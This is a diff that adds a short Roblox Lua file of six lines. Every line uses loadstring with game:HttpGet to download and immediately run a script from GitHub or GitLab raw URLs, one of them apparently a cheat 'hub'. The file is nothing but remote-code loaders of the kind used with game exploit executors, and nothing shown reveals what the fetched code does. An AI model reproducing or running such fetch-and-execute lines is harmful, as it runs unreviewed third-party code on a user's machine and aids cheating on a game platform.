@@ -1,0 +1,11 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/101iii101/file/refs/heads/main/test%201%20(1).txt"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/101iii101/file/refs/heads/main/test%202%20(1).txt"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/101iii101/file/refs/heads/main/test%203.txt"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/101iii101/file/refs/heads/main/test%204.txt"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/101iii101/file/refs/heads/main/test%205.txt"))()
+
+loadstring(game:HttpGet("https://gitlab.com/fenix39990-group/fenix39990-project/-/raw/main/last_peach_ghost_hub.txt?ref_type=heads"))()
